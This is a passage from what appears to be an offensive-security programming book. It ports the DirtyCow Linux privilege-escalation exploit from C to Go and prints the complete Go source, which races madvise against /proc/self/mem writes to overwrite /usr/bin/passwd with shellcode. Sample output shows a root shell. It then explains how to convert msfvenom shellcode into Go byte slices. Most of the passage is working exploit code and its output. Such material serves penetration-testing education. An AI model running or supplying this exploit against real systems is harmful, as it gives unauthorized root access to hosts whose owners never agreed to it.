❸ system(suid_binary);
}
Listing 9-10: The waitForWrite() function in C
func waitForWrite() {
buf := make([]byte, len(sc))
❶ for {
f, err := os.Open(SuidBinary)
if err != nil {
log.Fatal(err)
}
if _, err := f.Read(buf); err != nil {
log.Fatal(err)
}
f.Close()
if bytes.Compare(buf, sc) == 0 {
fmt.Printf("%s is overwritten\n", SuidBinary)
break
}
time.Sleep(1*time.Second)
}
❷ signals <- true
signals <- true
fmt.Println("Popping root shell")
fmt.Println("Don't forget to restore /tmp/bak\n")
attr := os.ProcAttr {
Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
}
proc, err := os.StartProcess(SuidBinary, nil, &attr) ❸
if err !=nil {
log.Fatal(err)
}
proc.Wait()
os.Exit(0)
}
Listing 9-11: The waitForWrite() function in Go
In both cases, the code defines an infinite loop that
monitors the SUID binary file for changes ❶. While the C
version uses memcmp() to check whether the shellcode has been
written to the target, the Go code uses bytes.Compare(). When the
shellcode is present, you’ll know the exploit succeeded in
overwriting the file. You then break out of the infinite loop
and signal the running threads that they can now stop ❷. As
with the code for the race conditions, the Go version does this
via a channel, while the C version uses an integer. Lastly, you
execute what is probably the best part of the function: the
SUID target file that now has your malicious code within it ❸.
The Go version is a little bit more verbose, as you need to pass
in attributes corresponding to stdin, stdout, and stderr: files
pointers to open input files, output files, and error file
descriptors, respectively.
Now let’s look at our main() function, which calls the
previous functions necessary to execute this exploit. Listing 9-
12 shows the C version, and Listing 9-13 shows the Go
version.
int main(int argc,char *argv[]) {
char *backup;
printf("DirtyCow root privilege escalation\n");
printf("Backing up %s.. to /tmp/bak\n", suid_binary);
❶ asprintf(&backup, "cp %s /tmp/bak", suid_binary);
system(backup);
❷ f = open(suid_binary,O_RDONLY);
fstat(f,&st);
printf("Size of binary: %d\n", st.st_size);
❸ char payload[st.st_size];
memset(payload, 0x90, st.st_size);
memcpy(payload, sc, sc_len+1);
❹ map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
printf("Racing, this may take a while..\n");
❺ pthread_create(&pth1, NULL, &madviseThread, suid_binary);
pthread_create(&pth2, NULL, &procselfmemThread, payload);
pthread_create(&pth3, NULL, &waitForWrite, NULL);
pthread_join(pth3, NULL);
return 0;
}
Listing 9-12: The main() function in C
func main() {
fmt.Println("DirtyCow root privilege escalation")
fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
❶ backup := exec.Command("cp", SuidBinary, "/tmp/bak")
if err := backup.Run(); err != nil {
log.Fatal(err)
}
❷ f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)
if err != nil {
log.Fatal(err)
}
st, err := f.Stat()
if err != nil {
log.Fatal(err)
}
fmt.Printf("Size of binary: %d\n", st.Size())
❸ payload := make([]byte, st.Size())
for i, _ := range payload {
payload[i] = 0x90
}
for i, v := range sc {
payload[i] = v
}
❹ mapp, _, _ = syscall.Syscall6(
syscall.SYS_MMAP,
uintptr(0),
uintptr(st.Size()),
uintptr(syscall.PROT_READ),
uintptr(syscall.MAP_PRIVATE),
f.Fd(),
0,
)
fmt.Println("Racing, this may take a while..\n")
❺ go madvise()
go procselfmem(payload)
waitForWrite()
}
Listing 9-13: The main() function in Go
The main() function starts by backing up the target
executable ❶. Since you’ll eventually be overwriting it, you
don’t want to lose the original version; doing so may adversely
affect the system. While C allows you to run an operating
system command by calling system() and passing it the entire
command as a single string, the Go version relies on the
exec.Command() function, which requires you to pass the
command as separate arguments. Next, you open the SUID
target file in read-only mode ❷, retrieving the file stats, and
then use them to initialize a payload slice of identical size as
the target file ❸. In C, you fill the array with NOP (0x90)
instructions by calling memset(), and then copy over a portion of
the array with your shellcode by calling memcpy(). These are
convenience functions that don’t exist in Go.
Instead, in Go, you loop over the slice elements and
manually populate them one byte at a time. After doing so,
you issue a Linux system call to the mapp() function ❹, which
maps the contents of your target SUID file to memory. As for
previous system calls, you can find the parameters needed for
mapp() by searching the Linux documentation. You may notice
that the Go code issues a call to syscall.Syscall6() rather than
syscall.Syscall(). The Syscall6() function is used for system calls that
expect six input parameters, as is the case with mapp(). Lastly,
the code spins up a couple of threads, calling the madvise() and
procselfmem() functions concurrently ❺. As the race condition
ensues, you call your waitForWrite() function, which monitors for
changes to your SUID file, signals the threads to stop, and
executes your malicious code.
For completeness, Listing 9-14 shows the entirety of the
ported Go code.
var mapp uintptr
var signals = make(chan bool, 2)
const SuidBinary = "/usr/bin/passwd"
var sc = []byte{
0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
--snip--
0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}
func madvise() {
for i := 0; i < 1000000; i++ {
select {
case <- signals:
fmt.Println("madvise done")
return
default:
syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100),
syscall.MADV_DONTNEED)
}
}
}
func procselfmem(payload []byte) {
f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)
if err != nil {
log.Fatal(err)
}
for i := 0; i < 1000000; i++ {
select {
case <- signals:
fmt.Println("procselfmem done")
return
default:
syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
f.Write(payload)
}
}
}
func waitForWrite() {
buf := make([]byte, len(sc))
for {
f, err := os.Open(SuidBinary)
if err != nil {
log.Fatal(err)
}
if _, err := f.Read(buf); err != nil {
log.Fatal(err)
}
f.Close()
if bytes.Compare(buf, sc) == 0 {
fmt.Printf("%s is overwritten\n", SuidBinary)
break
}
time.Sleep(1*time.Second)
}
signals <- true
signals <- true
fmt.Println("Popping root shell")
fmt.Println("Don't forget to restore /tmp/bak\n")
attr := os.ProcAttr {
Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
}
proc, err := os.StartProcess(SuidBinary, nil, &attr)
if err !=nil {
log.Fatal(err)
}
proc.Wait()
os.Exit(0)
}
func main() {
fmt.Println("DirtyCow root privilege escalation")
fmt.Printf("Backing up %s.. to /tmp/bak\n", SuidBinary)
backup := exec.Command("cp", SuidBinary, "/tmp/bak")
if err := backup.Run(); err != nil {
log.Fatal(err)
}
f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)
if err != nil {
log.Fatal(err)
}
st, err := f.Stat()
if err != nil {
log.Fatal(err)
}
fmt.Printf("Size of binary: %d\n", st.Size())
payload := make([]byte, st.Size())
for i, _ := range payload {
payload[i] = 0x90
}
for i, v := range sc {
payload[i] = v
}
mapp, _, _ = syscall.Syscall6(
syscall.SYS_MMAP,
uintptr(0),
uintptr(st.Size()),
uintptr(syscall.PROT_READ),
uintptr(syscall.MAP_PRIVATE),
f.Fd(),
0,
)
fmt.Println("Racing, this may take a while..\n")
go madvise()
go procselfmem(payload)
waitForWrite()
}
Listing 9-14: The complete Go port (/ch-9/dirtycow/main.go/)
To confirm that your code works, run it on your vulnerable
host. There’s nothing more satisfying than seeing a root shell.
alice@ubuntu:~$ go run main.go
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 47032
Racing, this may take a while..
/usr/bin/passwd is overwritten
Popping root shell
procselfmem done
Don't forget to restore /tmp/bak
root@ubuntu:/home/alice# id
uid=0(root) gid=1000(alice) groups=0(root),4(adm),1000(alice)
As you can see, a successful run of the program backs up
the /usr/bin/passwd file, races for control of the handle,
overwrites the file location with the newly intended values,
and finally produces a system shell. The output of the Linux id
command confirms that the alice user account has been elevated
to a uid=0 value, indicating root-level privilege.
CREATING SHELLCODE IN GO
In the previous section, you used raw shellcode in valid ELF
format to overwrite a legitimate file with your malicious
alternative. How might you generate that shellcode yourself?
As it turns out, you can use your typical toolset to generate
Go-friendly shellcode.
We’ll show you how to do this with msfvenom, a command-
line utility, but the integration techniques we’ll teach you
aren’t tool-specific. You can use several methods to work with
external binary data, be it shellcode or something else, and
integrate it into your Go code. Rest assured that the following
pages deal more with common data representations than
anything specific to a tool.
The Metasploit Framework, a popular exploitation and
post-exploitation toolkit, ships with msfvenom, a tool that
generates and transforms any of Metasploit’s available
payloads to a variety of formats specified via the -f argument.
Unfortunately, there is no explicit Go transform. However,
you can integrate several formats into your Go code fairly
easily with minor adjustments. We’ll explore five of these
formats here: C, hex, num, raw, and Base64, while keeping in
mind that our end goal is to create a byte slice in Go.
C Transform
If you specify a C transform type, msfvenom will produce the
payload in a format that you can directly place into C code.
This may seem like the logical first choice, since we detailed
many of the similarities between C and Go earlier in this
chapter. However, it’s not the best candidate for our Go code.
To show you why, look at the following sample output in C
format:
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
--snip--
"\x64\x00";
We’re interested almost exclusively in the payload. To
make it Go-friendly, you’ll have to remove the semicolon and
alter the line breaks. This means you’ll either need to
explicitly append each line by adding a + to the end of all lines
except the last, or remove the line breaks altogether to produce
one long, continuous string. For small payloads this may be
acceptable, but for larger payloads this becomes tedious to do
manually. You’ll find yourself likely turning to other Linux
commands such as sed and tr to clean it up.
Once you clean up the payload, you’ll have your payload
as a string. To create a byte slice, you’d enter something like
this:
payload := []byte("\xfc\xe8\x82...").
It’s not a bad solution, but you can do better.
Hex Transform
Improving upon the previous attempt, let’s look at a hex
transform. With this format, msfvenom produces a long,
continuous string of hexadecimal characters:
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff...6400
If this format looks familiar, it’s because you used it when
porting the Java deserialization exploit. You passed this value
as a string into a call to hex.DecodeString(). It returns a byte slice
and error details, if present. You could use it like so:
payload, err :=
hex.DecodeString("fce8820000006089e531c0648b50308b520c8b52148b
72280fb74a2631ff...6400")
Translating this to Go is pretty simple. All you have to do
is wrap your string in double quotes and pass it to the function.
However, a large payload will produce a string that may not be
aesthetically pleasing, wrapping lines or running beyond
recommended page margins. You may still want to use this
format, but we’ve provided a third alternative in the event that
you want your code to be both functional and pretty.
Num Transform
A num transform produces a comma-separated list of bytes in
numerical, hexadecimal format:
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b,
0x50, 0x30,
0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26,
0x31, 0xff,
--snip--
0x64, 0x00
You can use this output in the direct initialization of a byte
slice, like so:
payload := []byte{
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b,
0x50, 0x30,
0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26,
0x31, 0xff,
--snip--
0x64, 0x00,
}
Because the msfvenom output is comma-separated, the list of
bytes can wrap nicely across lines without clumsily appending
data sets. The only modification required is the addition of a
single comma after the last element in the list. This output
format is easily integrated into your Go code and formatted
pleasantly.
Raw Transform
A raw transform produces the payload in raw binary format.
The data itself, if displayed on the terminal window, likely
produces unprintable characters that look something like this:
ÐÐÐ`ÐÐ1ÐdÐP0ÐR
Ð8ÐuÐ}Ð;}$uÐXÐX$ÐfÐY IÐ:IÐ4ÐÐ1ÐÐÐÐ
You can’t use this data in your code unless you produce it
in a different format. So why, you may ask, are we even
discussing raw binary data? Well, because it’s fairly common
to encounter raw binary data, whether as a payload generated
from a tool, the contents of a binary file, or crypto keys.
Knowing how to recognize binary data and work it into your
Go code will prove valuable.
Using the xxd utility in Linux with the -i command line
switch, you can easily transform your raw binary data into the
num format of the previous section. A sample msfvenom
command would look like this, where you pipe the raw binary
output produced by msfvenom into the xxd command:
$ msfvenom -p [payload] [options] - f raw | xxd -i
You can assign the result directly to a byte slice as
demonstrated in the previous section.
Base64 Encoding
Although msfvenom doesn’t include a pure Base64 encoder, it’s
fairly common to encounter binary data, including shellcode,
in Base64 format. Base64 encoding extends the length of your
data, but also allows you to avoid ugly or unusable raw binary
data. This format is easier to work with in your code than num,
for example, and can simplify data transmission over protocols